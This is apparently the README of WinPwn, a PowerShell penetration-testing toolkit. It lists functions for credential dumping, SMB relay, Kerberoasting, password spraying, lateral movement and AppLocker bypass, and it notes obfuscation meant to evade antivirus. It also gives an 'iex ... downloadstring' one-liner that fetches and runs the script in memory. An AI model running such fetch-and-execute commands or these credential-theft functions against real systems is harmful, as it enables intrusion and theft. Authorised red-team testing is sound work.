# WinPwn
In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I often ran the same scripts one after the other to get information about the current system and/or the domain. To automate this process and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
The script is mostly based on well-known large other offensive security Powershell projects. They are loaded into RAM via IEX Downloadstring.

Yes it is not a C# and it may be flagged by antivirus solutions. Windows Defender for example blocks some of the known scripts/functions. Maybe someday a C# Version will follow.

Any suggestions, feedback and comments are welcome!

Just Import the Modules with:
`Import-Module .\WinPwn_v0.7.ps1` or 
`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1')`

Functions available after Import:
1) #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
2) #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
3) #### `sessionGopher` -> Executes Sessiongopher Asking you for parameters
4) #### `Mimikatzlocal` -> Executes Invoke-WCMDump and Invoke-Mimikatz
5) #### `localreconmodules` -> Collects infosec relevant system Information, Executes passhunt, Get-Computerdetails and Just another Windows Privilege escalation script + Winspect
6) #### `JAWS` -> Just another Windows Privilege Escalation script
7) #### `domainreconmodules` -> Powerview function output gets stored on disk for review. A search for AD-Passwords in description fields is done. Unconstrained delegation systems/users are enumerated. An AD-Report is generated in CSV Files (or XLS if excel is installed) with ADRecon. 
8) #### `Privescmodules` -> Executes different privesc scripts in memory (PowerUp Allchecks, Sherlock, GPPPasswords)
9) #### `lazagnemodule` -> Downloads and executes lazagne.exe (if not detected by AV) 
10) #### `latmov` -> Searches for Systems with Admin-Access in the domain for lateral movement. Mass-Mimikatz can be used after for the found systems. DomainPassword-Spray for new Credentials can also be used here.
11) #### `empirelauncher` -> Launch powershell empire oneliner on remote Systems
12) #### `shareenumeration` -> Invoke-Filefinder and Invoke-Sharefinder (Powerview / Powersploit)
13) #### `groupsearch` -> Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)
14) #### `Kerberoasting` -> Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking
15) #### `isadmin` -> Checks for local admin access on the local system
16) #### `Sharphound` -> Downloads Sharphound and collects Information for the Bloodhound DB
17) #### `adidnswildcard` -> Create a Active Directory-Integrated DNS Wildcard Record and run Inveigh for mass hash gathering.


The "oBEJHzXyARrq.exe"-Executable is an obfuscated Version of jaredhaights PSAttack Tool for Applocker/PS-Restriction Bypass (https://github.com/jaredhaight/PSAttack).

## TO-DO
- [x] Some obfuskation
- [ ] More obfuscation
- [ ] Proxy via PAC-File support
- [x] Get the scripts from my own creds repository (https://github.com/SecureThisShit/Creds) to be independent from changes in the original repositories
- [ ] More Recon/Exploitation functions
- [ ] msDS-AllowedToActOnBehalfOfOtherIdentity Ressource based constrained delegation

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/Pwn.png)

## CREDITS

- [X] [Kevin-Robertson](https://github.com/Kevin-Robertson/) - Inveigh, Powermad, Invoke-TheHash
- [X] [Arvanaghi](https://github.com/Arvanaghi/ - 
- [X] [PowerShellMafia](https://github.com/PowerShellMafia/) - Powersploit
- [X] [Dionach](https://github.com/Dionach/) - PassHunt
- [X] [A-mIn3](https://github.com/A-mIn3/) - WINSpect
- [X] [411Hall](https://github.com/411Hall/) - JAWS
- [X] [sense-of-security](https://github.com/sense-of-security/) - ADrecon
- [X] [dafthack](https://github.com/dafthack/) - DomainPasswordSpray
- [X] [rasta-mouse](https://github.com/rasta-mouse/) - Sherlock
- [X] [AlessandroZ](https://github.com/AlessandroZ/) - LaZagne
- [X] [samratashok](https://github.com/samratashok/) - nishang
- [X] [leechristensen](https://github.com/leechristensen/) - Random Repo

## Legal disclaimer:
Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
